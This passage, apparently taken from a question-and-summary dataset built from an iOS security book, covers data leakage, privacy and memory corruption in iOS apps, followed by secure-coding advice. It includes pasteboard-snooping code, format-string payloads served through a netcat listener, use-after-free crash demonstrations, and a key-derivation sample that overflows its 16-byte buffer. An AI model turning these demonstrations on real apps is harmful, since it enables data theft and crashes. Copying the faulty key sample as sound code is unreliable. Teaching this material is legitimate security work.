(see\nhttps://developer.apple.com/library/ios/documentation/UIKit/Reference/UIDevice_Class/index.html#//apple_ref/doc/uid/TP40006902-\nCH3-SW11) in the UIDevice class. This property returns a unique identifier for all applications from the same\nvendor, where a vendor is determined by data provided from the App Store or the app's bundle identifier. As\nsuch, this property can be used to track a device only by a particular vendor. Removing the last application\nfrom the vendor causes the identifier to be removed, or if an application from the vendor is later reinstalled\nthe identifier is reset. Nevertheless, you should ensure that this identifier is not unnecessarily exposed.\nProcessing the Address Book\nThe address book is perhaps one of the most sensitive data stores on an iOS device, and therefore understanding\nhow it's used in an application and whether content is intentionally or inadvertently exposed is important.\nBefore an application is able to access the address book it must first request permission from the user. If access\nis granted, an application has carte blanche access to the address book until the user manually revokes the\npermission from the Settings ➢ Privacy ➢ Contacts menu options. Some applications have abused this\nprivilege, namely the “Find and Call” application (see http://www.wired.com/2012/07/first-ios-malware-\nfound/) that uploaded users' address books and GPS coordinates to a remote server located in Russia.\nWhen you review an iOS application, your methodology should include an investigation of whether an\napplication can access the device's address book, what data it reads from it, and what it ultimately does with that\ndata. Applications that access the address book will likely use the AddressBook framework (see\nhttps://developer.apple.com/library/ios/documentation/addressbook/reference/AddressBook_iPhoneOS_Framework/_index.html#//apple_ref/doc/uid/TP40007212\nThe use of ABAddressBookCopyArrayOfAllPeople and related methods should come under particular scrutiny. To\nhelp you identify whether an application uses this API call, consider using the Adios tool from Veracode (see\nhttps://www.veracode.com/security-tools/adios), which can automate this task for you.\nHandling Geolocation Data\nApple provides a means of accessing the device's geolocation features using the Core Location framework.\nDevice coordinates can be determined using GPS, cell tower triangulation, or Wi-Fi network proximity. When\nusing geolocation data, developers should consider two main privacy concerns: how and where data is logged\nand the requested accuracy of coordinates.\nCore Location is event driven, and an app looking to receive location information must register to receive event\nupdates. Event updates can provide longitude and latitude coordinates for use in the app. As previously\nmentioned, an important part of reviewing an app is evaluating how this coordinate data is stored. If the app\nmust store coordinate information client-side, the developer should protect this data using one of the data\nstorage protection methods detailed in Chapter 5. However, to prevent someone from using the app to track a\nuser's movements, location information should not be stored on the device. In addition to client-side logging, if\nthe app passes coordinate information to a server, developers should ensure that any logging of this information\nis done so anonymously.\nAnother consideration for developers when requesting event updates is the accuracy of the information they\nrequire. For example, an app used for satellite navigation is likely to require very accurate location information,\nwhereas an app that provides information about the closest restaurant does not need to be as accurate. Similar\nto location logging, the accuracy of the coordinates raises privacy concerns that developers should consider\nwhen writing iOS applications.\nWhen using CLocationManager, an app can request accuracy using the CLLocationAccuracy class that offers the\nfollowing constants:\nkCLLocationAccuracyBestForNavigation\nkCLLocationAccuracyBest\nkCLLocationAccuracyNearestTenMeters\nkCLLocationAccuracyHundredMeters\nkCLLocationAccuracyKilometer\nkCLLocationAccuracyThreeKilometers\nWhen assessing an iOS application that uses location data, review how it uses this class and validate that the\naccuracy constants used are suitable for the application's use case.\nIdentifying Data Leaks\nMany iOS applications unintentionally leak data to other applications or adversaries with access to the\nfilesystem. In many cases, the data leaked can be of a sensitive nature, leading to the exposure of application\nsecrets such as session cookies or even credentials. This type of data leakage typically occurs when a developer\nuses an API that has side effects the developer is not aware of and who therefore does not take preventative\nmeasures to secure the data.\nThis section documents some of the ways a developer using the iOS APIs may inadvertently leak sensitive\napplication data.\nLeaking Data in Application Logs\nLogging can prove to be a valuable resource for debugging during development. However, in some cases it can\nleak sensitive or proprietary information, which is then cached on the device until the next reboot. Logging in an\niOS application is typically performed using the NSLog method that causes a message to be sent to the Apple\nSystem Log (ASL). These console logs can be manually inspected using the Xcode device's application. Since iOS\n7, ASL will only return data belonging to the application that requests it, preventing a malicious application from\nmonitoring the log for secrets.\nIn the past, jailbreaking a device has caused NSLog output to be redirected to syslog. In this scenario the\npossibility exists for sensitive information to be stored on the filesystem in syslog. Therefore, developers should\navoid using NSLog to log sensitive or proprietary information.\nThe simplest way for developers to avoid compiling NSLog into production releases is to redefine it with a\ndummy pre-processor macro such as #define NSLog(...).\nIdentifying Pasteboard Leakage\nMany developers want to offer users the ability to copy and paste data to not only different areas of their\napplication, but also to other applications on the device. If the pasteboard is used to copy sensitive data,\ndepending on how it is implemented, data could be leaked from the pasteboard to other third-party applications.\nThree types of pasteboards are found in iOS applications:\nThe system pasteboard—This is the general pasteboard defined in the UIPasteboardNameGeneral constant\nof the UIPasteboard class. All applications can access data stored on this pasteboard.\nThe find pasteboard—This is typically used for search operations and contains the data from the most\nrecent strings entered into the search bar. The find pasteboard is implemented using the\nUIPasteboardNameFind constant of the UIPasteboard class. All applications can access data stored on this\npasteboard.\nCustom pasteboards—Creating your own pasteboard is also possible using a unique identifier or a system-\ncreated identifier. Data placed on this pasteboard stays private to your application or family of applications.\nWhen either of the first two pasteboards is used, the potential exists that data can be disclosed to any\napplication that is passively monitoring the pasteboard. The following code snippet shows a simple example of\nhow you could implement an application that passively monitors the pasteboard. This example launches a\nbackground task that reads the contents of the pasteboard every 5 seconds, and if the content has changed,\nsends it to the console log:\n- (void)applicationDidEnterBackground:(UIApplication *)application\n{\ndispatch_async(dispatch_get_global_queue( \\\nDISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{\nUIApplication* uiapp = [UIApplication sharedApplication];\nUIBackgroundTaskIdentifier *bgTaskId;\nbgTaskId = [uiapp beginBackgroundTaskWithExpirationHandler:^{}];\nNSString* contents = [[UIPasteboard generalPasteboard] string];\nwhile (true){\nNSString *newContents = [[UIPasteboard generalPasteboard] \\\nstring];\nif (![newContents isEqualToString:contents] && \\\nnewContents != nil){\nNSLog(@\"Contents of pasteboard: %@\",[[UIPasteboard \\\ngeneralPasteboard] string]);\ncontents = [[UIPasteboard generalPasteboard] string];\n}\nsleep(5);\n}\n});\n}\nAlthough such a simple example is unlikely to evade the App Store vetting process, it demonstrates how content\nstored on the pasteboard can be inadvertently disclosed to other applications.\nTo avoid disclosing data to all third-party applications on the device, you should use a custom pasteboard, which\nyou can create as follows:\nUIPasteboard *userPasteBoard =[UIPasteboard\npasteboardWithName:@\"MyAppDefinedPasteboard\" create:YES];\nuserPasteBoard.persistent=YES;\nAt times an application might need to use the system pasteboard for certain fields. However, particularly\nsensitive fields such as passwords may not need the copy and paste functions so you can disable the copy and\npaste menu on individual UITextFields items using code similar to the following:\n-(BOOL)canPerformAction:(SEL)action withSender:(id)sender {\nUIMenuController *menu = [UIMenuController \\\nsharedMenuController];\nif (menu) {\nmenu.menuVisible = NO;\n}\nreturn NO;\n}\nHandling Application State Transitions\nWhen an application is open, the possibility exists for it to be sent into the background by a change in state, as a\nresult of actions such as receiving an incoming call or the user pressing the home button. When an application\nis suspended in the background, iOS takes a snapshot of the app and stores it in the application's cache\ndirectory. When the application is reopened, the device uses the screenshot to create the illusion that the\napplication loads instantly rather than taking time to reload the application.\nIf any sensitive information is open in the application when it enters the background, the snapshot is written to\nthe filesystem in cleartext, albeit protected with the default data protection API class. Any system that can be\npaired with the device can access the snapshot. You can find the snapshot in the caches directory, as shown in\nFigure 4.1.\nFigure 4.1 Accessing application snapshots with iExplorer\nThe snapshot is simply a PNG image that displays the current view of the device when the state change was\ninitiated. Figure 4.2 shows how a registration page containing account information could be captured.\nFigure 4.2 A snapshot can capture a registration page.\nHowever, detecting when a state change is occurring and modifying the current view to mitigate against this\ntype of data leakage is possible. You can use the UIApplication delegate method\napplicationDidEnterBackground to detect when an application is entering the background and from here the\nview can be masked. For example, if specific fields contain sensitive information, the application can hide these\nusing the “hidden” attribute:\n- (void)applicationDidEnterBackground:(UIApplication *)application {\nviewController.accountNumber.hidden = YES;\n}\nConversely, when the application restarts, it can unhide these fields by doing the reverse in the\napplicationDidBecomeActive delegate:\n- (void)applicationDidBecomeActive:(UIApplication *)application {\nviewController.accountNumber.hidden = NO;\n}\nKeyboard Caching\nTo improve the user experience, iOS attempts to customize the autocorrect feature by caching input that is typed\ninto the device's keyboard. Almost every non-numeric word is cached on the filesystem in plaintext in the\nkeyboard cache file located in /var/mobile/Library/Keyboard:\nIpod10:/var/mobile/Library/Keyboard root# strings en_GB-dynamic-text.dat\nDynamicDictionary-5\nburp\ncall\ndialer\nadmin\nhttp\nmdsec\nsecret\ntraining\nThis has the obvious consequence that application data you wouldn't want to be cached—such as usernames,\npasswords, and answers to security questions—could be inadvertently stored in the keyboard cache.\nHowever, you can prevent certain fields from being populated into the cache by either marking a field as a\nsecure field using the secureTextEntry property or by explicitly disabling autocorrect by setting the\nautocorrectionType property to UITextAutocorrectionTypeNo. Here is an example of how to do this:\nsecurityAnswer.autocorrectionType = UITextAutocorrectionTypeNo;\nsecurityAnswer.secureTextEntry = YES;\nHTTP Response Caching\nTo display a remote website, an iOS application often uses a UIWebView to render the HTML content. A\nUIWebView object uses WebKit, the same rendering engine as MobileSafari, and just like MobileSafari a\nUIWebView can cache server responses to the local filesystem depending on how the URL loading is\nimplemented.\nYou can find the cache data stored in the Cache.db database, located within the application's Library/Caches/\nfolder:\niPhone:# sqlite3 Cache.db\nSQLite version 3.7.13\nEnter \".help\" for instructions\nsqlite> .tables\ncfurl_cache_blob_data cfurl_cache_response\ncfurl_cache_receiver_data cfurl_cache_schema_version\nsqlite>\nInside this database you find a number of tables that contain the response data and requested URL\n(cfurl_cache_response), response headers (cfurl_cache_blob_data), and the response blob\n(cfurl_cache_receiver_data); for example:\nsqlite> select * from cfurl_cache_response limit 1;\n1|0|-479790032|0|http://sa.bbc.co.uk/bbc/bbc/s?name=news.page&ns_m2=yes&ns_setsi\nteck=546108443DC20193&ml_name=BBCBeacon_iOS&ml_version=3.5&app_name=news&ap\np_version=2.1.4&app_type=mobile-app&prod_name=news&\nistats_visitor_id=c39770d71484042cfe5063f1c2bd2c93&ns__t=1415645252&\norientation=portrait&app_edition=news-ios-uk|2014-11-1018:47:35|\nsqlite>\nWhen sensitive content is returned in server responses, the possibility exists for it to be stored in the cache\ndatabase. During any iOS application assessment, you should include an inspection of the cache database in\nyour methodology to ensure that credentials or other sensitive content are not inadvertently cached.\nSeveral strategies let you clear your application's cache or prevent it from caching at all, and the one that works\nbest for you will depend on your implementation. To clear your cache and remove all stored cached URL\nresponses you can use the following method:\n[[NSURLCache sharedURLCache] removeAllCachedResponses];\nWhile using NSURLConnection you can prevent caching on HTTPS responses using code similar to the following:\n-(NSCachedURLResponse *)connection:(NSURLConnection *)connection\nwillCacheResponse:(NSCachedURLResponse *)cachedResponse\n{\nNSCachedURLResponse *newCachedResponse=cachedResponse;\nif ([[[[cachedResponse response] URL] scheme] isEqual:@\"https\"]) {\nnewCachedResponse=nil;\n}\nreturn newCachedResponse;\n}\nMemory Corruption in iOS Applications\niOS applications are typically resistant to classic memory corruption issues such as buffer overflows if the\ndevelopers rely on Objective-C or Swift to perform memory allocations because fixed sizes for buffers can't be\nspecified. However, C can be intermingled with iOS apps, and seeing the use of external libraries or\nperformance-dependent code, such as cryptography developed in C, is not uncommon. These approaches can\ngive rise to the traditional memory corruption vulnerabilities. However, exploitation is no small task and subject\nto the device's built-in protection mechanisms, so other vulnerabilities are needed by someone trying to bypass\nthese protection mechanisms. However, a small number of memory corruption issues have transcended into\nObjective-C and Swift, as detailed in the following sections.\nFormat String Vulnerabilities\nFormat string vulnerabilities form a class of memory corruption bugs that arise through the improper use of\nObjective-C or Swift methods that accept a format specifier. Vulnerable methods include but are not limited to\nthe following:\nNSLog\n[NSString stringWithFormat]\n[NSString stringByAppendingFormat]\n[NSString initWithFormat]\n[NSMutableString appendFormat]\n[NSAlert alertWithMessageText]\n[NSAlert informativeTextWithFormat]\n[NSException format]\n[NSMutableString appendFormat]\n[NSPredicate predicateWithFormat]\nFormat string vulnerabilities arise when an attacker is able to provide the format specifier in part or as a whole\nto the relevant method. For example, consider the following:\nNSString *myURL=@\"http://10.0.2.1/test\";\nNSURLRequest *theRequest = [NSURLRequest requestWithURL:[NSURL \\\nURLWithString:myURL]];\nNSURLResponse *resp = nil;\nNSError *err = nil;\nNSData *response = [NSURLConnection sendSynchronousRequest: \\\ntheRequest returningResponse:&resp error: &err];\nNSString * theString = [[NSString alloc] initWithData:response \\\nencoding:NSASCIIStringEncoding];\nNSLog(theString);\nIn this example a request is made to a web server running on 10.0.2.1; the response is then stored in a NSData\nobject, converted to an NSString, and logged using NSLog. In the documented usage of the NSLog function, NSLog\nis a wrapper for NSLogv and args is a variable number of arguments, as shown here:\nvoid NSLogv (\nNSString *format,\nva_list args\n);\nHowever, in this instance the developer has supplied a single argument, allowing the attacker to specify the type\nof parameter that would be logged.\nIf you run the previous example in a debugger, you can see how the format string vulnerability can be triggered\nusing a simple HTTP web server response:\nbash-3.2# nc -lvp 80\nlistening on [any] 80 . . .\n10.0.2.2: inverse host lookup failed: Unknown host\nconnect to [10.0.2.1] from (UNKNOWN) [10.0.2.2] 52141\nGET /test HTTP/1.1\nHost: 10.0.2.1\nUser-Agent: fmtstrtest (unknown version) CFNetwork/548.0.4 Darwin/11.0.0\nAccept: */*\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 16\naaaa%x%x%x%x%x%x\nThe HTTP response body is logged to NSLog and triggers the format string vulnerability, causing stack memory\nto be dumped to the console log, as shown here:\n(gdb) r\nStarting program: /private/var/root/fmtstrtest\n2014-08-12 09:10:29.103 fmtstrtst[8008:303]\naaaa124a600782fe5b84411f0b00\nProgram exited normally.\n(gdb)\nTo exploit traditional format string vulnerabilities an attacker can use the %n format specifier, which allows him\nto write to an arbitrary memory address read from the stack. However, this format specifier is not available in\nObjective-C or Swift. Instead, iOS format string vulnerabilities can be exploited using the %@ specifier that\ndefines an object. Consequently, this may allow an arbitrary function pointer to be called.\nConsider the following example that simply passes the value from argv[1] to NSLog:\nint main(int argc, const char* argv[])\n{\nNSAutoreleasePool *pool =[[NSAutoreleasePool alloc] init];\nNSString *n = [[NSString alloc] initWithCString:argv[1]];\nNSLog(n);\n[pool drain];\nreturn 0;\n}\nPopping enough data to reach the user-controlled part of stack memory, you can see how the %@ specifier causes\na crash when dereferencing the pointer:\n(gdb) r bbbbbbbbbbbbbbbb%x%x%x%x%x%x%x%%x%x%x%x%x%x%x%%x%x%x%x%x%x%x%x\n%x%x%x%x%x%x%%x%x%x%x%x%x%x%%x%x%x%x%x%x%x%%x%x%x%x%x%x%x%%x%x%x%x%x%x\n%x%%x%x%x%x%x%x%x%x%x%x%@\nStarting program: /private/var/root/fmtstrtest\nbbbbbbbbbbbbbbbb%x%x%x%x%x%x%x%%x%x%x%x%x%x%x%%x%x%x%x%x%x%x%%x%x%x%x\n%x%x%x%%x%x%x%x%x%x%x%%x%x%x%x%x%x%x%x%x%x%x%x%x%x%%x%x%x%x%x%x%x%%x\n%x%x%x%x%x%x%x%x%x%@\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_INVALID_ADDRESS at address: 0x62626262\n0x320f8fb6 in ?? ()\n(gdb)\nSimilarly, in Swift, insecure code that ultimately leads to a format string being evaluated such as,\nvar str = \"AAAA%x%x%x%x%x%x%x%x\"\nNSLog(str)\nmay lead to the following:\n2014-11-10 20:53:58.245 fmtstrtest[22384:2258322] AAAA00000025852504\nTo prevent format string vulnerabilities, a secure implementation would include a format specifier, where\nNSLog(str) would become NSLog(\"%@\", str). Swift also introduces the concept of interpolation, which allows\nyou to create a string and easily populate it with other format types. Consider the following example that can be\nused to create a new string (see\nhttps://developer.apple.com/library/mac/documentation/swift/conceptual/swift_programming_language/StringsAndCharacters.html\nlet multiplier = 3\nlet message = \"\\(multiplier) times 2.5 is \\(Double(multiplier) * 2.5)\"\nInterpolation allows you to populate new types into a string by wrapping them in parentheses and prefixing\nthem with a backslash. However, you should still use a format specifier if it is later passed into a method that\nrequires one.\nHowever, in most situations Objective-C and Swift will use the heap for storing objects and, therefore, in\npractice, exploitation is unlikely.\nObject Use-After-Free\nObject use-after-free vulnerabilities occur when a reference to an object still exists after the object has been\nfreed. If this freed memory is reused and an attacker is able to influence the reused memory, in some\ncircumstances it may be possible to cause arbitrary code execution. Exploitation of use-after-free vulnerabilities\nin Objective-C is documented in-depth within the Phrack article by nemo\n(http://www.phrack.org/issues.html?issue=66&id=4) and is recommended reading for those looking for a\ngreater understanding of the topic. To demonstrate this type of exploitation at a high-level, consider the\nfollowing example:\nMAHH *mahh = [[MAHH alloc] init];\n[mahh release];\n[mahh echo: @\"MAHH example!\"];\nIn the previous example an instance of the MAHH class is first created and then freed using release. However,\nafter the object has been released the echo method is called on the previously freed pointer. In this instance a\ncrash is unlikely, because the memory will not have been corrupted through reallocation or deconstruction.\nHowever, consider an example whereby the heap has been sprayed with user-controlled data:\nMAHH *mahh = [[MAHH alloc] init];\n[mahh release];\nfor(int i=0; i<50000; i++) {\nchar *buf = strdup(argv[1]);\n}\n[mdsec echo: @\"MAHH example!\"];\nRunning this example causes an access violation when the echo method is called due to the reuse of heap\nmemory used by the previously freed object instance:\n(gdb) r AAAA\nStarting program: /private/var/root/objuse AAAA\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_INVALID_ADDRESS at address: 0x41414149\n0x320f8fbc in ?? ()\n(gdb)\nSince iOS 5, applications have had the option to use Automatic Reference Counting (ARC), which passes the\nresponsibility of memory management from the developer to the compiler and is required for applications that\nuse Swift. Consequently for applications using ARC, there is likely to be a significant reduction in the number of\nuse-after-free issues, because the developer no longer bears the responsibility for releasing or retaining objects.\nFor further details on ARC refer to Chapter 2.\nOther Native Code Implementation Issues\nDiscovering native code programming vulnerabilities is a meaty topic and far beyond the scope of this book.\nHowever, for the moment it is sufficient to understand that when intermingled with C and C++, iOS\napplications can be affected by the traditional native code vulnerabilities such as buffer overflows, underflows,\nsignedness issues, and the like. To learn more about these types of issues many resources are available;\nhowever, The Art of Software Security Assessment (ISBN-13: 978-0321444424; Dowd et al, Addison-Wesley\nProfessional) is particularly comprehensive.\nSummary\nIn this chapter you learned about the common categories of vulnerability to which iOS applications can be\nsusceptible. Many of these issues arise by virtue of the iOS SDK APIs and may not be well known by developers,\nand as such commonly exist in real-world applications.\nMany iOS applications are prone to data leakage, which can present a problem for security-conscious\napplications. Data leaks commonly occur as a result of an application's using features of the platform such as\nWebViews, which are often prone to caching response data and cookies, both of which can have a negative\nimpact on the security of an application.\nHow applications handle personal and privacy-related data is also an important aspect of mobile security and\nshould form a key portion of any application review. In particular, the device should not log or disclose any\ninformation pertaining to the user, the user's device, or location because doing so may turn the application into\na tracking device.\nAlthough occurring less frequently than in other types of applications, such as server-side services, memory\ncorruption can occur in iOS applications. In practice, most memory corruption vulnerabilities in a third-party\napplication will result in no more than a Denial of Service unless chained with other vulnerabilities.",
    "question": "What are the common ways iOS applications can inadvertently expose sensitive data or user privacy information through API side effects and what measures can developers take to secure their implementations?",
    "summary": "This chapter discusses common iOS application vulnerabilities, focusing on data leakage, improper use of APIs, and memory corruption issues. It highlights the risks associated with handling personal data, device identifiers, geolocation, and application state transitions. Developers should be cautious about how they use APIs like NSLog, UIPasteboard, and Core Location to prevent sensitive information from being exposed. Additionally, memory corruption vulnerabilities, such as format string issues and object use-after-free, can occur, though they are less common in modern iOS apps due to features like Automatic Reference Counting."
  },
  {
    "start": 27,
    "end": 30,
    "text": "CHAPTER 5\nWriting Secure iOS Applications\nSo far you have learned the various techniques that you can use to attack and exploit vulnerabilities within iOS\napplications. This chapter progresses from the offensive aspects of mobile app security to documenting the ways\nin which you can secure an application. Understanding the defensive strategies that an application can employ is\nessential knowledge for any security professional or developer; it not only helps you offer remedial and\npreventative advice but understanding the intricacies of defense can help you to become a better tester.\nThis chapter covers the ways in which you can protect the data in your application, not only at rest but also in\ntransit. It also details how you can avoid some of the injection attacks that were detailed in Chapter 3, as well as\nhow you begin to build defenses in to your application to slow down your adversary and hopefully make them\nconsider softer targets.\nProtecting Data in Your Application\nIn most mobile applications the data is the thing that is of most interest to an attacker. As such, considering\nhow your data is received; processed; transmitted to other components, hosts, and ultimately destroyed is\nimportant. This section details how to protect data within your application and reduce the likelihood of it being\nintercepted or compromised by an attacker.\nGeneral Design Principles\nPrior to implementation, considering how your desired functionality may impact the security of your application\nis important. With a little thought and a carefully constructed design plan, you can avoid or mitigate many\ncommon vulnerabilities. Following are several factors that you might want to consider when designing your\napplication:\nHow data is stored in the application—It goes without saying that the best approach to data storage is to\navoid storing data at all. Unfortunately, this is not feasible for many applications, particularly those that need\nto operate in an “offline” mode. As part of the design process you should always consider what data your\napplication handles and how you can best reduce the amount of data that is persistently stored.\nFurthermore, how and where the data is stored is an important consideration. For example, storing sensitive\ndata in NSDefaults will lead to its quickly being identified by an attacker, whereas data being stored using\nsteganography and embedded within an image file used by your application is likely to be discovered only by\na significant amount of reverse engineering. In addition to how you store data, you should consider what\ndata your application may be inadvertently storing by consequence of the functionality you have built in to it.\nA good example is if your application uses a UIWebView: You may not be aware that you are inadvertently\ncaching web data, cookies, form input, and potentially other content just by virtue of using this class!\nHow and when data should be available—An important factor to consider when designing your\napplication is what states will exist and what data should be accessible in those states. For example, if your\napplication handles cryptographic key material, typically it should not be accessible or memory resident\nwhen the application is in a locked state and should only be made available following user authentication.\nPrior to implementation, creating a design plan showing the different state transitions and what data should\nbe accessible in each will help you to reduce the exposure of data within your application.\nHow access to the application will be protected—If your application is handling particularly important\ndata such as financial, corporate, or something equally sensitive, you may want to consider implementing\nclient-side authentication. Forcing a user to authenticate to the application can offer some mitigation against\nunauthorized access in the event a device is lost or stolen. Where possible, you should also combine it with\nauthentication via iOS’ LocalAuthentication framework and TouchID, which can offer validation that the\nuser is physically present providing no tampering has taken place. You should also consider several\nimportant factors when implementing client-side authentication: namely whether the passcode is stored and\nif so, where; how it is validated; the key space of the passcode; and how other application areas will be\nprotected until the authentication has been completed.\nWhat entry points exist—Identifying the entry points to your application at an early stage can help you\nrecognize areas where potentially tainted data may be introduced. Armed with this information, you can\ndefine the types and format of the data that can enter your application, building appropriate sanitization\nrules to parse this data along the way. Entry points to consider may include data originating from server-side\napplications, Bluetooth, protocol handlers, quick response (QR) codes, and iBeacons, among many other\npossible sources.\nHow third-party components affect the application—An interesting and yet often unexplored design\nconsideration is the impact and security of any third-party libraries that you might be using within your\napplication. In many cases developers bundle third-party libraries with their applications to reduce\ndevelopment time and leverage already-mature functionality. However, these libraries may not have come\nunder close scrutiny, particularly if they are closed source. Using third-party libraries grants the library\ndeveloper the equivalent to code execution within your application as well as access to your application’s\ndata. An example of this would be the inclusion of a third-party ad library, for which many previous\nexamples of abuse exist, ranging from stealing the user’s address book to submitting UDID and geolocation\ninformation to online resources.\nThese examples are just a handful of the key design considerations that you should assess prior to developing an\napplication. In general, design is a critical stage in the software development lifecycle (SDL) for any application\nand you should use it to preempt vulnerabilities before development.\nImplementing Encryption\nAs you will know from the section “Understanding the Data Protection API” in Chapter 2, you can encrypt\nindividual files on the filesystem using a key derived from the user’s passcode. However, the usual\nrecommendation to secure sensitive information is to supplement this encryption with your own encryption\nimplementation to give additional assurance against the following scenarios:\nOn-device attacks (for example, malware or drive-by-download exploitation)\nExploitation of any secure boot chain components that allow the filesystem to be mounted\nUsers who set an insecure or default passcode\nDevices without a passcode\nThis section only briefly touches on the topic of encryption principles because a thorough examination is far\nbeyond the scope of this book.\nImplementing an encryption scheme in your application is often a daunting task, and one that you should not\ntake lightly. You must consider many factors to avoid inadvertently exposing your data to unauthorized access.\nThe following is a set of guidelines that you should follow when implementing encryption within your\napplication:\nPerhaps the most important point when debating how to implement an encryption solution is that you\nshould always use a tried-and-tested encryption algorithm. Never “roll your own” because it is always a\nrecipe for disaster! AES-XTS with a key size of 256 is widely accepted as being suitable for most use cases for\nmobile applications. If hashing is required, then SHA-256 or higher is generally regarded as being sufficient.\nYou should implement key generation using an accepted key derivation function such as PBKDF2\n(password-based key derivation function) with an accepted number of iterations. The acceptable number of\niterations is often a contentious point in crypto communities; however, it is widely believed that the figure\nshould increase each year to account for improving technologies. As a benchmark, Apple acknowledges that\nit uses 10,000 iterations of PBKDF2 as part of the keybag design\n(https://s3.amazonaws.com/s3.documentcloud.org/documents/1302613/ios-security-guide-sept-\n2014.pdf).\nWhen you use user input to derive a key, always keep your key space as large as possible. If you’re simply\nprompting the user for a four-digit PIN then be aware that only 10,000 possible combinations exist. Using\nthis as the only input to derive your encryption key can clearly lead to its being brute-forced quite quickly!\nA common problem faced by developers is how to protect your encryption key; this is where you should\nconsider master key encryption. In this scenario, the key used to ultimately encrypt your data is itself\nencrypted, preferably using a key derived from the user or for further assurance also with a second key\nderived from a post authentication server-side response. This solution has the added benefit that the user\ncan change his or her password without having to re-encrypt all their data. Only the master key would need\nto be re-encrypted. If using public key cryptography, you can also use a similar technique to protect your\nprivate key within the client.\nWhen using a salt, always use a random value with at least 10,000 iterations (the higher the better, but be\naware of performance trade-offs). Following this advice will help to make brute-force and rainbow table\nattacks against your implementation computationally expensive.\nApple provides a number of APIs to help you accomplish many of the common tasks that you will likely need to\ndo when implementing an encryption solution in your application, many of which come as part of the Security\nframework or the Common Crypto library. You will find some example use cases in this section.\nTo obtain entropy or a cryptographically secure block of random bytes using the /dev/random random-number\ngenerator, you can use the SecRandomCopyBytes function. A sample implementation used to generate a 128-bit\nsalt is shown here:\n+(NSData*) generateSalt:(size_t) length\n{\nNSMutableData *data = [NSMutableData dataWithLength:length];\nint result = SecRandomCopyBytes(kSecRandomDefault, length,\ndata.mutableBytes);\nif(result != 0){\nNSLog(@\"%@\", @\"Unable to generate salt\");\nreturn nil;\n}\nreturn data;\n}\n+(NSData*) salt\n{\nreturn [self generateSalt:16];\n}\nHere is a simple implementation of how to generate a 256-bit AES key using PBKDF2 and the Common Crypto\nlibrary by virtue of the CCKeyDerivationPBKDF function:\n+(NSData*) generateKey:(NSString*)password salt:(NSData*)salt\nrounds:(uint)rounds\n{\nNSMutableData *key = [NSMutableData dataWithLength:16];\nint result = CCKeyDerivationPBKDF(kCCPBKDF2, [password UTF8String],\n[password lengthOfBytesUsingEncoding: NSUTF8StringEncoding],\n[salt bytes], [salt length], kCCPRFHmacAlgSHA256, rounds, key.mutableBytes,\nkCCKeySizeAES256);\nif (result == kCCParamError)\n{\nNSLog(@\"%@\", @\"Unable to generate key\");\nreturn nil;\n}\nreturn key;\n}\nA common problem faced by developers is how to go about encrypting content stored in a database, which often\nleads to you “rolling your own” encryption solution to encrypt content before it is inserted into the database.\nThis has the obvious disadvantage of leaving the database metadata unencrypted. A popular solution to this\nproblem is SQLCipher (https://www.zetetic.net/sqlcipher/), which is an open-source SQLite database\nimplementation that supports encryption. Using SQLCipher certainly makes encryption of SQLite databases\nrelatively seamless. Here is a simple implementation:\n-(void)OpenDatabaseConnection:(NSString*)dbName pass:(NSString*)password\n{\nNSString *databasePath = \\\n[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, \\\nNSUserDomainMask, YES) objectAtIndex:0] stringByAppendingPathComponent:\\\ndbName];\nsqlite3 *db;\nif (sqlite3_open([databasePath UTF8String], &db) == SQLITE_OK) {\nconst char* key = [password UTF8String];\nsqlite3_key(db, key, strlen(key));\nif (sqlite3_exec(db, (const char*) \"SELECT count(*) FROM \\\nsqlite_master;\", NULL, NULL, NULL) == SQLITE_OK) {\n// password is correct\n} else {\n// incorrect password!\n}\nsqlite3_close(db);\n}\n}\nIn this example, a database relative to the application’s Documents folder can be opened using the appropriate\ndatabase encryption password. Of course, the same principles apply as previously noted and the key should be\nderived from input that is taken from the user.\nIn summary, encryption is a key security control that you can use in your application to protect sensitive data\n(not just on the filesystem!), and in most cases you should implement your own form of encryption in addition\nto that of the Data Protection API. Although a number of pitfalls exist, implementing encryption securely is\npossible and when doing so you should use a password derived from the user to generate your encryption key\ninstead of using a static or hard-coded key in your application.\nProtecting Your Data in Transit\nSo far you have learned how to secure your data at rest. However, more than likely you will at some point need\nto communicate your data to a server-side application. Chapter 3 detailed the need for a secure channel and also\ncovered some of the pitfalls that can occur when implementing one. You also learned how with sufficient access\nto the operating system you could bypass security controls such as certificate pinning. However, pinning still\nremains an important security control and is generally recommended for any application. In case you skipped\nthis section of Chapter 3, certificate pinning is the process of associating a particular host that you connect to\nwith a known and expected certificate or public key. This protection gives you additional confidence that the\nhost you are connecting to is who it reports to be and negates the impact of a compromised Certificate\nAuthority. In short, the process requires you to embed a public key or certificate within your application,\nallowing you to compare it against what the server presents during your SSL session. The OWASP wiki provides\nan excellent write-up of the advantages of certificate pinning, including examples of how to implement it across\ndifferent platforms (https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning). For\ncompleteness, a short example of how you would implement this, borrowed from the aforementioned resource,\nis described here.\nWithin the didReceiveAuthenticationChallenge delegate method for your NSURLConnection, you should include\nthe following code, which reads the mahh .der certificate from within the application’s bundle directory and\ndoes a binary comparison against the certificate presented by the server:\n-(void)connection:(NSURLConnection *)connection\ndidReceiveAuthenticationChallenge:(NSURLAuthenticationChallenge *)\nchallenge\n{\nif ([[[challenge protectionSpace] authenticationMethod] isEqualToString:\nNSURLAuthenticationMethodServerTrust])\n{\ndo\n{\nSecTrustRef serverTrust = [[challenge protectionSpace] \\\nserverTrust];\nif(nil == serverTrust)\nbreak; /* failed */\nOSStatus status = SecTrustEvaluate(serverTrust, NULL);\nif(!(errSecSuccess == status))\nbreak; /* failed */\nSecCertificateRef serverCertificate = \\\nSecTrustGetCertificateAtIndex(serverTrust, 0);\nif(nil == serverCertificate)\nbreak; /* failed */\nCFDataRef serverCertificateData = \\\nSecCertificateCopyData(serverCertificate);\n//[(__bridge id)serverCertificateData autorelease];\nif(nil == serverCertificateData)\nbreak; /* failed */\nconst UInt8* const data = \\\nCFDataGetBytePtr(serverCertificateData);\nconst CFIndex size = CFDataGetLength(serverCertificateData);\nNSData* cert1 = [NSData dataWithBytes:data 